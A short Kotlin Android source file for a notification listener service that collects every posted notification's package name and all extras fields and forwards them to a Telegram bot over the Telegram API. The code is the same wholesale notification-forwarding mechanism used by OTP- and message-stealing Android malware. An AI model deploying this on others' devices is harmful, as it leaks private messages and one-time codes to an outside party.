package com.example.notifforwarder

import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import okhttp3.*
import java.io.IOException

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras: Bundle = sbn.notification.extras
        val packageName = sbn.packageName

        val dataDump = StringBuilder()
        dataDump.append("📱 Notif dari: $packageName\n\n")

        for (key in extras.keySet()) {
            val value = extras.get(key)
            dataDump.append("🔸 *$key*: ${value?.toString() ?: "null"}\n")
        }

        sendToTelegram(dataDump.toString())
    }

    private fun sendToTelegram(message: String) {
        val botToken = "YOUR_BOT_TOKEN"
        val chatId = "YOUR_CHAT_ID"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"

        val client = OkHttpClient()
        val requestBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .add("parse_mode", "Markdown")
            .build()

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("NotifForwarder", "Gagal kirim ke Telegram: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d("NotifForwarder", "Telegram response: ${response.body?.string()}")
            }
        })
    }
}